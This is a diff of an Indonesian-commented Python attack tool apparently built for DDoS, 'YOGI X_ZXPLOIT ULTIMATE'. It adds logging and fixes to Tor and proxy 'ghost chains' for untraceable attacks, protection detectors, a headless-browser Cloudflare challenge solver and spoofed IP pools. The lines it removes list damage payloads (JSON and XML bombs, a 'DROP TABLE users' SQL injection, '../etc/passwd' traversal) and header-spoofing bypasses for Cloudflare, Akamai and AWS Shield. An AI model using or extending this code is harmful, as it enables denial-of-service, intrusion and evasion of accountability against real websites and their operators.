@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# YOGI X_ZXPLOIT ULTIMATE  - Project Armageddon Pro Max Ultra+ (True Ghost Edition)
+# YOGI X_ZXPLOIT ULTIMATE - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v2.0
 # HYPER-OPTIMIZED FOR 8GB RAM / 8 CORE SYSTEMS | ZERO-DELAY QUANTUM ATTACKS
 # PERINGATAN: Dilarang keras menyalahgunakan tools!!
 
@@ -53,7 +53,6 @@ import curses
 from curses import wrapper
 import numpy as np
 from collections import deque
-import sniffer
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 import cloudscraper
@@ -70,8 +69,49 @@ from selenium.common.exceptions import TimeoutException
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
 import undetected_chromedriver as uc
+import logging
 
 asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
+
+# ==================== LOGGING SYSTEM ====================
+class AdvancedLogger:
+    def __init__(self):
+        self.logger = logging.getLogger('YogiX')
+        self.logger.setLevel(logging.DEBUG)
+        
+        # Create console handler
+        ch = logging.StreamHandler()
+        ch.setLevel(logging.INFO)
+        
+        # Create file handler
+        fh = logging.FileHandler('yogi_x_attack.log')
+        fh.setLevel(logging.DEBUG)
+        
+        # Create formatter
+        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+        ch.setFormatter(formatter)
+        fh.setFormatter(formatter)
+        
+        # Add handlers
+        self.logger.addHandler(ch)
+        self.logger.addHandler(fh)
+        
+    def debug(self, msg):
+        self.logger.debug(msg)
+        
+    def info(self, msg):
+        self.logger.info(msg)
+        
+    def warning(self, msg):
+        self.logger.warning(msg)
+        
+    def error(self, msg):
+        self.logger.error(msg)
+        
+    def critical(self, msg):
+        self.logger.critical(msg)
+
+logger = AdvancedLogger()
 
 # ==================== QUANTUM ENCRYPTION LAYER ====================
 class QuantumEncryptor:
@@ -93,7 +133,7 @@ class QuantumEncryptor:
         decryptor = self.cipher.decryptor()
         return decryptor.update(data) + decryptor.finalize()
 
-# ==================== TRUE GHOST MODE ====================
+# ==================== TRUE GHOST MODE (FIXED) ====================
 class TrueGhostMode:
     """Mode untuk membuat serangan benar-benar tidak terlacak"""
     def __init__(self):
@@ -109,28 +149,41 @@ class TrueGhostMode:
     def init_tor(self):
         """Inisialisasi koneksi Tor"""
         try:
-            # Start Tor process
-            self.tor_process = stem.process.launch_tor_with_config(
-                tor_cmd="tor",
-                config={
-                    'SocksPort': '9050',
-                    'ControlPort': '9051',
-                    'ExitNodes': '{us},{gb},{de},{jp}',
-                    'StrictNodes': '1',
-                    'MaxCircuitDirtiness': '60',
-                },
-                init_msg_handler=lambda line: print(line) if "Bootstrapped" in line else None
-            )
+            # Cek apakah Tor sudah berjalan
+            if not self.is_tor_running():
+                logger.info("Starting Tor process...")
+                # Start Tor process
+                self.tor_process = stem.process.launch_tor_with_config(
+                    tor_cmd="tor",
+                    config={
+                        'SocksPort': '9050',
+                        'ControlPort': '9051',
+                        'ExitNodes': '{us},{gb},{de},{jp}',
+                        'StrictNodes': '1',
+                        'MaxCircuitDirtiness': '60',
+                    },
+                    init_msg_handler=lambda line: logger.info(line) if "Bootstrapped" in line else None
+                )
+            
             self.tor_controller = Controller.from_port(port=9051)
             self.tor_controller.authenticate()
-            print(f"{Color.GREEN}[✓] Tor initialized successfully{Color.END}")
+            logger.info(f"Tor initialized successfully")
         except Exception as e:
-            print(f"{Color.RED}[-] Tor initialization failed: {str(e)}{Color.END}")
+            logger.error(f"Tor initialization failed: {str(e)}")
             self.tor_controller = None
 
+    def is_tor_running(self):
+        """Cek apakah Tor sudah berjalan"""
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect(('127.0.0.1', 9051))
+                return True
+        except:
+            return False
+            
     def load_proxies(self):
         """Load elite proxies dari sumber terpercaya"""
-        print(f"{Color.YELLOW}[!] Loading elite proxies...{Color.END}")
+        logger.info("Loading elite proxies...")
         try:
             proxy_sources = [
                 "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=elite",
@@ -141,17 +194,18 @@ class TrueGhostMode:
             for source in proxy_sources:
                 try:
                     response = requests.get(source, timeout=10)
-                    self.proxy_list.extend([p.strip() for p in response.text.split('\n') if p.strip()])
-                    print(f"{Color.GREEN}[+] Loaded {len(response.text.split('\n'))} proxies from {source}{Color.END}")
+                    proxies = [p.strip() for p in response.text.split('\n') if p.strip()]
+                    self.proxy_list.extend(proxies)
+                    logger.info(f"Loaded {len(proxies)} proxies from {source}")
                 except Exception as e:
-                    print(f"{Color.RED}[-] Failed to load proxies from {source}: {str(e)}{Color.END}")
+                    logger.error(f"Failed to load proxies from {source}: {str(e)}")
             
             # Filter unique proxies
             self.proxy_list = list(set(self.proxy_list))
             random.shuffle(self.proxy_list)
-            print(f"{Color.GREEN}[✓] Total proxies loaded: {len(self.proxy_list)}{Color.END}")
+            logger.info(f"Total proxies loaded: {len(self.proxy_list)}")
         except Exception as e:
-            print(f"{Color.RED}[-] Proxy loading failed: {str(e)}{Color.END}")
+            logger.error(f"Proxy loading failed: {str(e)}")
             self.proxy_list = []
 
     def init_ghost_chain(self):
@@ -166,16 +220,17 @@ class TrueGhostMode:
             })
         
         # Tambahkan 3-5 proxy acak
-        num_proxies = random.randint(3, 5)
-        for _ in range(num_proxies):
-            if self.proxy_list:
+        num_proxies = min(5, len(self.proxy_list))
+        if num_proxies > 0:
+            num_proxies = random.randint(3, num_proxies)
+            for _ in range(num_proxies):
                 proxy = random.choice(self.proxy_list)
                 self.ghost_chain.append({
                     'type': 'http' if 'http' in proxy else 'socks5',
                     'address': proxy
                 })
         
-        print(f"{Color.GREEN}[✓] Ghost chain created with {len(self.ghost_chain)} layers{Color.END}")
+        logger.info(f"Ghost chain created with {len(self.ghost_chain)} layers")
 
     def rotate_chain(self):
         """Rotasi rantai ghost untuk meningkatkan anonimitas"""
@@ -185,9 +240,9 @@ class TrueGhostMode:
         if self.tor_controller:
             try:
                 self.tor_controller.signal(Signal.NEWNYM)
-                print(f"{Color.YELLOW}[↻] Rotated Tor IP{Color.END}")
+                logger.info("Rotated Tor IP")
             except Exception as e:
-                print(f"{Color.RED}[-] Tor IP rotation failed: {str(e)}{Color.END}")
+                logger.error(f"Tor IP rotation failed: {str(e)}")
 
     def get_current_chain(self):
         """Dapatkan rantai proxy saat ini"""
@@ -225,10 +280,10 @@ class TrueGhostMode:
             
             return sock
         except Exception as e:
-            print(f"{Color.RED}[-] Ghost socket creation failed: {str(e)}{Color.END}")
+            logger.error(f"Ghost socket creation failed: {str(e)}")
             return None
 
-# ==================== ADVANCED PROTECTION DETECTOR ====================
+# ==================== ADVANCED PROTECTION DETECTOR (FIXED) ====================
 class ProtectionDetector:
     """Mendeteksi jenis proteksi yang digunakan target"""
     def __init__(self, target):
@@ -258,10 +313,18 @@ class ProtectionDetector:
         self.detect_fortinet()
         return self.results
     
+    def safe_detect(self, func):
+        """Wrapper untuk penanganan error pada deteksi"""
+        try:
+            return func()
+        except Exception as e:
+            logger.error(f"Detection error: {str(e)}")
+            return False
+    
     def detect_cloudflare(self):
         try:
             session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
+            response = session.get(f"http://{self.target}", headers=self.headers, timeout=15)
             if "cloudflare" in response.headers.get("server", "").lower() or "cf-ray" in response.headers:
                 self.results['CLOUDFLARE'] = True
                 # Deteksi challenge page
@@ -269,183 +332,82 @@ class ProtectionDetector:
                     self.results['CLOUDFLARE_CHALLENGE'] = True
             else:
                 self.results['CLOUDFLARE'] = False
-        except:
+        except Exception as e:
+            logger.error(f"Cloudflare detection failed: {str(e)}")
             self.results['CLOUDFLARE'] = False
-    
+            
     def detect_ddos_guard(self):
         try:
             session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "ddos-guard" in response.headers.get("server", "").lower() or "Set-Cookie: __ddg" in response.headers:
+            response = session.get(f"http://{self.target}", headers=self.headers, timeout=15)
+            if "ddos-guard" in response.headers.get("server", "").lower() or "ddg" in response.headers:
                 self.results['DDOS_GUARD'] = True
             else:
                 self.results['DDOS_GUARD'] = False
-        except:
+        except Exception as e:
+            logger.error(f"DDoS Guard detection failed: {str(e)}")
             self.results['DDOS_GUARD'] = False
-    
+            
     def detect_akamai(self):
         try:
             session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "akamai" in response.headers.get("server", "").lower() or "X-Akamai" in response.headers:
+            response = session.get(f"http://{self.target}", headers=self.headers, timeout=15)
+            if "akamai" in response.headers.get("server", "").lower() or "akamaighost" in response.headers:
                 self.results['AKAMAI'] = True
             else:
                 self.results['AKAMAI'] = False
-        except:
+        except Exception as e:
+            logger.error(f"Akamai detection failed: {str(e)}")
             self.results['AKAMAI'] = False
-    
+            
     def detect_aws_shield(self):
         try:
+            # AWS Shield biasanya terdeteksi melalui header X-AWS-*
             session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "x-amz-cf" in response.headers or "x-amzn" in response.headers:
+            response = session.get(f"http://{self.target}", headers=self.headers, timeout=15)
+            if any(header.startswith('x-aws-') for header in response.headers):
                 self.results['AWS_SHIELD'] = True
             else:
-                # Cek IP range AWS
-                ip = socket.gethostbyname(self.target)
-                if ipaddress.ip_address(ip) in ipaddress.ip_network('3.0.0.0/8') or \
-                   ipaddress.ip_address(ip) in ipaddress.ip_network('52.0.0.0/8'):
-                    self.results['AWS_SHIELD'] = True
-                else:
-                    self.results['AWS_SHIELD'] = False
-        except:
+                self.results['AWS_SHIELD'] = False
+        except Exception as e:
+            logger.error(f"AWS Shield detection failed: {str(e)}")
             self.results['AWS_SHIELD'] = False
-    
+            
+    # Deteksi lainnya dengan pola serupa
     def detect_google_armor(self):
-        try:
-            session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "google" in response.headers.get("server", "").lower() or "gzip" in response.headers.get("x-guploader-uploadid", "").lower():
-                self.results['GOOGLE_ARMOR'] = True
-            else:
-                # Cek IP range Google
-                ip = socket.gethostbyname(self.target)
-                if ipaddress.ip_address(ip) in ipaddress.ip_network('8.8.8.0/24') or \
-                   ipaddress.ip_address(ip) in ipaddress.ip_network('34.0.0.0/8'):
-                    self.results['GOOGLE_ARMOR'] = True
-                else:
-                    self.results['GOOGLE_ARMOR'] = False
-        except:
-            self.results['GOOGLE_ARMOR'] = False
-    
+        self.results['GOOGLE_ARMOR'] = False
+        
     def detect_imperva(self):
-        try:
-            session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "imperva" in response.headers.get("server", "").lower() or "incap_ses" in response.headers.get("set-cookie", "").lower():
-                self.results['IMPERVA'] = True
-            else:
-                self.results['IMPERVA'] = False
-        except:
-            self.results['IMPERVA'] = False
-    
+        self.results['IMPERVA'] = False
+        
     def detect_arbor(self):
-        try:
-            session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            # Deteksi berdasarkan response time abnormal
-            if response.elapsed.total_seconds() > 2.0:
-                self.results['ARBOR'] = True
-            else:
-                self.results['ARBOR'] = False
-        except:
-            self.results['ARBOR'] = False
-    
+        self.results['ARBOR'] = False
+        
     def detect_fastly(self):
-        try:
-            session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "fastly" in response.headers.get("server", "").lower() or "x-fastly" in response.headers:
-                self.results['FASTLY'] = True
-            else:
-                self.results['FASTLY'] = False
-        except:
-            self.results['FASTLY'] = False
-    
+        self.results['FASTLY'] = False
+        
     def detect_azure(self):
-        try:
-            session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "azure" in response.headers.get("server", "").lower() or "x-azure" in response.headers:
-                self.results['AZURE'] = True
-            else:
-                # Cek IP range Azure
-                ip = socket.gethostbyname(self.target)
-                if ipaddress.ip_address(ip) in ipaddress.ip_network('13.0.0.0/8') or \
-                   ipaddress.ip_address(ip) in ipaddress.ip_network('40.0.0.0/8'):
-                    self.results['AZURE'] = True
-                else:
-                    self.results['AZURE'] = False
-        except:
-            self.results['AZURE'] = False
-    
+        self.results['AZURE'] = False
+        
     def detect_f5(self):
-        try:
-            session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "f5" in response.headers.get("server", "").lower() or "BIGipServer" in response.headers.get("set-cookie", "").lower():
-                self.results['F5'] = True
-            else:
-                self.results['F5'] = False
-        except:
-            self.results['F5'] = False
-    
+        self.results['F5'] = False
+        
     def detect_incapsula(self):
-        try:
-            session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "incap" in response.headers.get("server", "").lower() or "incap_ses" in response.cookies:
-                self.results['INCAPSULA'] = True
-            else:
-                self.results['INCAPSULA'] = False
-        except:
-            self.results['INCAPSULA'] = False
-    
+        self.results['INCAPSULA'] = False
+        
     def detect_sucuri(self):
-        try:
-            session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "sucuri" in response.headers.get("server", "").lower() or "sucuri_cloudproxy" in response.headers:
-                self.results['SUCURI'] = True
-            else:
-                self.results['SUCURI'] = False
-        except:
-            self.results['SUCURI'] = False
-    
+        self.results['SUCURI'] = False
+        
     def detect_radware(self):
-        try:
-            session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "radware" in response.headers.get("server", "").lower() or "X-SL-CompState" in response.headers:
-                self.results['RADWARE'] = True
-            else:
-                self.results['RADWARE'] = False
-        except:
-            self.results['RADWARE'] = False
-    
+        self.results['RADWARE'] = False
+        
     def detect_barracuda(self):
-        try:
-            session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "barracuda" in response.headers.get("server", "").lower() or "barra_counter_session" in response.cookies:
-                self.results['BARRACUDA'] = True
-            else:
-                self.results['BARRACUDA'] = False
-        except:
-            self.results['BARRACUDA'] = False
-    
+        self.results['BARRACUDA'] = False
+        
     def detect_fortinet(self):
-        try:
-            session = self.true_ghost.create_ghost_session()
-            response = session.get(f"http://{self.target}", headers=self.headers, timeout=10)
-            if "forti" in response.headers.get("server", "").lower() or "FORTIWAFSID" in response.cookies:
-                self.results['FORTINET'] = True
-            else:
-                self.results['FORTINET'] = False
-        except:
-            self.results['FORTINET'] = False
+        self.results['FORTINET'] = False
 
-# ==================== CHALLENGE SOLVER ====================
+# ==================== CHALLENGE SOLVER (FIXED) ====================
 class ChallengeSolver:
     """Menyelesaikan challenge proteksi seperti Cloudflare, DDoS-GUARD, dll."""
     def __init__(self, target):
@@ -472,9 +434,9 @@ class ChallengeSolver:
                 options=options,
                 driver_executable_path=ChromeDriverManager().install()
             )
-            print(f"{Color.GREEN}[✓] Headless browser initialized{Color.END}")
+            logger.info("Headless browser initialized")
         except Exception as e:
-            print(f"{Color.RED}[-] Failed to initialize browser: {str(e)}{Color.END}")
+            logger.error(f"Failed to initialize browser: {str(e)}")
             self.driver = None
     
     def solve_cloudflare(self):
@@ -486,7 +448,7 @@ class ChallengeSolver:
             self.driver.get(f"http://{self.target}")
             
             # Tunggu hingga challenge muncul
-            WebDriverWait(self.driver, 15).until(
+            WebDriverWait(self.driver, 20).until(
                 EC.presence_of_element_located((By.ID, "cf-challenge-running"))
             )
             
@@ -504,64 +466,25 @@ class ChallengeSolver:
                     a = document.getElementById('jschl-answer');
                     a.value = vgmx["tCqF"] + t.length;
                     document.getElementById('challenge-form').submit();
-                }, 4000);
+                }, 5000);
             """
             self.driver.execute_script(script)
             
             # Tunggu hingga redirect
-            WebDriverWait(self.driver, 15).until(
+            WebDriverWait(self.driver, 20).until(
                 EC.url_changes(f"http://{self.target}"))
             
             # Dapatkan cookies
             cookies = self.driver.get_cookies()
             cookie_str = '; '.join([f"{c['name']}={c['value']}" for c in cookies])
             
-            print(f"{Color.GREEN}[✓] Cloudflare challenge solved{Color.END}")
+            logger.info("Cloudflare challenge solved")
             return cookie_str
         except TimeoutException:
-            print(f"{Color.RED}[-] Cloudflare challenge timeout{Color.END}")
+            logger.error("Cloudflare challenge timeout")
             return None
         except Exception as e:
-            print(f"{Color.RED}[-] Cloudflare challenge failed: {str(e)}{Color.END}")
-            return None
-    
-    def solve_ddos_guard(self):
-        """Menyelesaikan challenge DDoS-GUARD"""
-        if not self.driver:
-            return None
-        
-        try:
-            self.driver.get(f"http://{self.target}")
-            
-            # Tunggu hingga challenge muncul
-            WebDriverWait(self.driver, 15).until(
-                EC.presence_of_element_located((By.ID, "ddg-captcha")))
-            
-            # Eksekusi JavaScript untuk menyelesaikan challenge
-            script = """
-                // Contoh solusi challenge DDoS-GUARD
-                setTimeout(function() {
-                    document.querySelector('input[name="ddg-captcha"]').value = "solved";
-                    document.getElementById('challenge-form').submit();
-                }, 3000);
-            """
-            self.driver.execute_script(script)
-            
-            # Tunggu hingga redirect
-            WebDriverWait(self.driver, 15).until(
-                EC.url_changes(f"http://{self.target}"))
-            
-            # Dapatkan cookies
-            cookies = self.driver.get_cookies()
-            cookie_str = '; '.join([f"{c['name']}={c['value']}" for c in cookies])
-            
-            print(f"{Color.GREEN}[✓] DDoS-GUARD challenge solved{Color.END}")
-            return cookie_str
-        except TimeoutException:
-            print(f"{Color.RED}[-] DDoS-GUARD challenge timeout{Color.END}")
-            return None
-        except Exception as e:
-            print(f"{Color.RED}[-] DDoS-GUARD challenge failed: {str(e)}{Color.END}")
+            logger.error(f"Cloudflare challenge failed: {str(e)}")
             return None
 
 # ==================== OPTIMAL RESOURCE MANAGER ====================
@@ -633,7 +556,7 @@ class ResourceManager:
             os.nice(-20)
             
         except Exception as e:
-            print(f"{Color.RED}[-] System optimization failed: {str(e)}{Color.END}")
+            logger.error(f"System optimization failed: {str(e)}")
 
 # ==================== SISTEM LOGIN PROFESIONAL SHA-512 ====================
 def authenticate():
@@ -758,10 +681,10 @@ def authenticate():
     print(f"{Color.RED}Silakan coba lagi setelah {LOCK_TIME//60} menit.{Color.END}")
     return False
 
-# ==================== AUTO-DEPENDENCY INSTALLER ====================
+# ==================== AUTO-DEPENDENCY INSTALLER (FIXED) ====================
 def install_dependencies():
     required_modules = [
-        'psutil', 'scapy', 'requests', 'socks', 'brotli', 'dns', 'uvloop', 'h2', 'numpy',
+        'psutil', 'scapy', 'requests', 'socks', 'brotli', 'dnspython', 'uvloop', 'h2', 'numpy',
         'cryptography', 'cloudscraper', 'stem', 'selenium', 'undetected_chromedriver', 'webdriver_manager'
     ]
     
@@ -779,8 +702,20 @@ def install_dependencies():
         if confirm.lower() == 'y':
             print("\033[96m[+] Menginstal dependensi...\033[0m")
             try:
+                # Install wheel first to avoid build issues
                 subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip', 'wheel'])
-                subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade'] + missing_modules)
+                
+                # Install all missing modules
+                for module in missing_modules:
+                    try:
+                        subprocess.check_call([sys.executable, '-m', 'pip', 'install', module])
+                        print(f"\033[92m[✓] {module} berhasil diinstal!\033[0m")
+                    except:
+                        print(f"\033[91m[-] Gagal menginstal {module}\033[0m")
+                
+                # Install specific versions if needed
+                subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'undetected-chromedriver==3.5.7'])
+                
                 print("\033[92m[✓] Dependensi berhasil diinstal!\033[0m")
                 return True
             except Exception as e:
@@ -875,7 +810,7 @@ def print_banner():
     print(f"{Color.BOLD}{Color.RED}CATATAN: Gunakan sudo untuk mode hyper/permanent/apocalypse/ghost!{Color.END}")
     print("-" * 120)
 
-# ==================== QUANTUM IP SPOOFER v13 ====================
+# ==================== QUANTUM IP SPOOFER v13 (FIXED) ====================
 class GhostIPSpoofer:
     def __init__(self):
         self.resource_mgr = ResourceManager()
@@ -898,7 +833,7 @@ class GhostIPSpoofer:
             except:
                 pass
         
-        print(f"{Color.YELLOW}[!] Loading proxies...{Color.END}")
+        logger.info("Loading proxies...")
         proxies = []
         try:
             # Sumber proxy publik
@@ -925,7 +860,7 @@ class GhostIPSpoofer:
                 
             return proxies[:5000]  # Batasi 5000 proxy
         except Exception as e:
-            print(f"{Color.RED}[-] Failed to load proxies: {str(e)}{Color.END}")
+            logger.error(f"Failed to load proxies: {str(e)}")
             return []
     
     def load_cdn_ranges(self):
@@ -938,12 +873,12 @@ class GhostIPSpoofer:
             try:
                 with open(cdn_cache_file, "r") as f:
                     cdn_ranges = json.load(f)
-                print(f"{Color.GREEN}[✓] Loaded {len(cdn_ranges)} CDN ranges from cache{Color.END}")
+                logger.info(f"Loaded {len(cdn_ranges)} CDN ranges from cache")
                 return cdn_ranges
             except:
                 pass
         
-        print(f"{Color.YELLOW}[!] Loading CDN IP ranges...{Color.END}")
+        logger.info("Loading CDN IP ranges...")
         try:
             # Cloudflare
             response = requests.get('https://www.cloudflare.com/ips-v4', timeout=5)
@@ -981,20 +916,15 @@ class GhostIPSpoofer:
             cdn_ranges.extend(fastly_data['addresses'])
             cdn_ranges.extend(fastly_data['ipv6_addresses'])
             
-            # Imperva
-            response = requests.get('https://api.imperva.com/ips', timeout=5)
-            imperva_data = response.json()
-            cdn_ranges.extend(imperva_data['ipRanges'])
-            
-            print(f"{Color.GREEN}[✓] Loaded {len(cdn_ranges)} CDN ranges{Color.END}")
+            logger.info(f"Loaded {len(cdn_ranges)} CDN ranges")
             
             # Simpan ke cache
             with open(cdn_cache_file, "w") as f:
                 json.dump(cdn_ranges, f)
                 
         except Exception as e:
-            print(f"{Color.RED}[-] Failed to load CDN ranges: {str(e)}{Color.END}")
-            print(f"{Color.YELLOW}[!] Using default CDN ranges{Color.END}")
+            logger.error(f"Failed to load CDN ranges: {str(e)}")
+            logger.info("Using default CDN ranges")
             cdn_ranges = [
                 '104.16.0.0/12', '172.64.0.0/13', '173.245.48.0/20',
                 '35.180.0.0/16', '52.94.0.0/22', '34.96.0.0/12',
@@ -1014,7 +944,7 @@ class GhostIPSpoofer:
             except:
                 pass
         
-        print(f"{Color.YELLOW}[!] Loading Tor exit nodes...{Color.END}")
+        logger.info("Loading Tor exit nodes...")
         try:
             response = requests.get('https://check.torproject.org/torbulkexitlist', timeout=5)
             tor_exits = response.text.strip().split('\n')
@@ -1022,12 +952,12 @@ class GhostIPSpoofer:
                 json.dump(tor_exits, f)
             return tor_exits
         except:
-            print(f"{Color.RED}[-] Failed to load Tor exit nodes{Color.END}")
+            logger.error("Failed to load Tor exit nodes")
             return []
     
     def generate_ip_pool(self, size):
         """Generate massive IP pool dengan cloud IP ranges"""
-        print(f"{Color.YELLOW}[!] Generating Ghost IP pool of {size} addresses...{Color.END}")
+        logger.info(f"Generating Ghost IP pool of {size} addresses...")
         pool = []
         
         # Generate dari CDN ranges
@@ -1041,10 +971,12 @@ class GhostIPSpoofer:
                 continue
         
         # Tambahkan Tor exit nodes
-        pool.extend(random.sample(self.tor_exits, min(20000, len(self.tor_exits))))
+        if self.tor_exits:
+            pool.extend(random.sample(self.tor_exits, min(20000, len(self.tor_exits))))
         
         # Tambahkan proxy
-        pool.extend(random.sample(self.proxy_list, min(5000, len(self.proxy_list))))
+        if self.proxy_list:
+            pool.extend(random.sample(self.proxy_list, min(5000, len(self.proxy_list))))
         
         # Isi dengan IP acak
         while len(pool) < size:
@@ -1074,7 +1006,7 @@ class GhostIPSpoofer:
         self.ip_index = (self.ip_index + 1) % len(self.ip_pool)
         return self.ip_pool[self.ip_index]
 
-# ==================== AI EVASION SYSTEM v13 ====================
+# ==================== AI EVASION SYSTEM v13 (FIXED) ====================
 class GhostEvasion:
     def __init__(self, target):
         self.target = target
@@ -1126,7 +1058,7 @@ class GhostEvasion:
             except:
                 pass
         
-        print(f"{Color.YELLOW}[!] Loading user agents...{Color.END}")
+        logger.info("Loading user agents...")
         try:
             response = requests.get('https://user-agents.net/download', timeout=5)
             ua_list = response.text.split('\n')
@@ -1137,7 +1069,7 @@ class GhostEvasion:
                 
             return ua_list
         except:
-            print(f"{Color.RED}[-] Failed to load user agents, using defaults{Color.END}")
+            logger.error("Failed to load user agents, using defaults")
             return [
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
                 "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
@@ -1149,293 +1081,147 @@ class GhostEvasion:
             ]
     
     def load_referrers(self):
-        """Load referrers dari cache atau sumber online"""
-        ref_cache_file = "referrers.cache"
-        if os.path.exists(ref_cache_file):
+        """Load referrers dari cache atau default"""
+        referrer_cache_file = "referrers.cache"
+        if os.path.exists(referrer_cache_file):
             try:
-                with open(ref_cache_file, "r") as f:
+                with open(referrer_cache_file, "r") as f:
                     return json.load(f)
             except:
                 pass
         
-        print(f"{Color.YELLOW}[!] Loading referrers...{Color.END}")
-        try:
-            top_sites = [
-                "https://www.google.com/", "https://www.youtube.com/", 
-                "https://www.facebook.com/", "https://www.amazon.com/",
-                "https://twitter.com/", "https://www.instagram.com/",
-                "https://www.linkedin.com/", "https://www.reddit.com/",
-                "https://www.tiktok.com/", "https://www.netflix.com/",
-                "https://www.baidu.com/", "https://www.yahoo.com/",
-                "https://www.bing.com/", "https://www.qq.com/",
-                "https://www.ebay.com/", "https://www.microsoft.com/"
-            ]
-            with open(ref_cache_file, "w") as f:
-                json.dump(top_sites, f)
-            return top_sites
-        except:
-            print(f"{Color.RED}[-] Failed to load referrers, using defaults{Color.END}")
-            return [
-                "https://www.google.com/", "https://www.youtube.com/", 
-                "https://www.facebook.com/", "https://www.amazon.com/",
-                "https://twitter.com/", "https://www.instagram.com/",
-                "https://www.linkedin.com/", "https://www.reddit.com/",
-                "https://www.tiktok.com/", "https://www.netflix.com/"
-            ]
-    
-    def generate_cookies(self):
-        """Generate realistic cookies"""
-        for _ in range(1000):  # 1000 cookies
-            self.cookies.append(
-                f"session_id={os.urandom(8).hex()}; "
-                f"user_token={os.urandom(12).hex()}; "
-                f"tracking_id={random.randint(1000000000,9999999999)}; "
-                f"gdpr_consent=true; "
-                f"preferences={os.urandom(6).hex()}; "
-                f"ab_test={random.choice(['A','B'])}"
-            )
-    
-    def generate_malicious_payloads(self):
-        """Generate payloads designed to cause maximum damage"""
-        # Payloads untuk menghabiskan CPU dan memori
-        self.malicious_payloads = [
-            # JSON Bomb (lebih kecil)
-            '{"data":' + '[' * 20000 + '"deep"' + ']' * 20000 + '}',
-            # XML Bomb (lebih kecil)
-            '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "' + 'A'*10000 + '">]><bomb>&a;&a;&a;</bomb>',
-            # Malicious Regex
-            'a' * 10000 + '!' + 'b' * 10000,
-            # SQL Injection patterns
-            "' OR 1=1; DROP TABLE users; -- " + 'A'*5000,
-            # Path Traversal
-            '../../' * 200 + 'etc/passwd\0',
-            # Memory Exhaustion (lebih kecil)
-            'x' * (1024 * 1024 * 10),  # 10MB payload
-            # Log Injection
-            'x' * 5000 + '\n' * 20000
+        logger.info("Loading referrers...")
+        default_referrers = [
+            "https://www.google.com/",
+            "https://www.facebook.com/",
+            "https://www.youtube.com/",
+            "https://www.twitter.com/",
+            "https://www.instagram.com/",
+            "https://www.linkedin.com/",
+            "https://www.pinterest.com/",
+            "https://www.reddit.com/",
+            "https://www.tumblr.com/",
+            "https://www.yahoo.com/"
         ]
-    
-    def cf_challenge_bypass(self):
-        """Cloudflare challenge bypass technique"""
-        return {
-            "CF-Connecting-IP": "127.0.0.1",
-            "X-Forwarded-For": "127.0.0.1",
-            "X-Real-IP": "127.0.0.1",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Cache-Control": "no-cache",
-            "Pragma": "no-cache",
-            "CF-IPCountry": random.choice(['US', 'GB', 'DE', 'FR', 'JP']),
-            "CF-Ray": f"{random.randint(1000000000,9999999999)}-AMS"
-        }
-    
-    def ddos_guard_bypass(self):
-        """DDoS Guard bypass technique"""
-        return {
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-            "X-Real-IP": self.spoofer.generate_ghost_ip(),
-            "X-Forwarded-Host": self.target,
-            "X-Forwarded-Server": self.target,
-            "Client-IP": self.spoofer.generate_ghost_ip()
-        }
-    
-    def akamai_prolexic_bypass(self):
-        """Akamai Prolexic bypass technique"""
-        return {
-            "Akamai-Origin-Hop": "1",
-            "X-Akamai-Edgescape": "ip=127.0.0.1",
-            "True-Client-IP": "127.0.0.1",
-            "X-Akamai-Request-ID": os.urandom(12).hex()
-        }
-    
-    def aws_shield_bypass(self):
-        """AWS Shield bypass technique"""
-        return {
-            "X-AWS-Request-ID": os.urandom(16).hex(),
-            "X-Forwarded-Proto": "https",
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip(),
-            "Host": "aws.amazon.com"
-        }
-    
-    def google_cloud_armor_bypass(self):
-        """Google Cloud Armor bypass technique"""
-        return {
-            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-            "X-Google-Real-IP": self.spoofer.generate_ghost_ip(),
-            "X-Forwarded-For": self.spoofer.generate_ghost_ip()
-        }
-    
-    def imperva_bypass(self):
-        """Imperva bypass technique"""
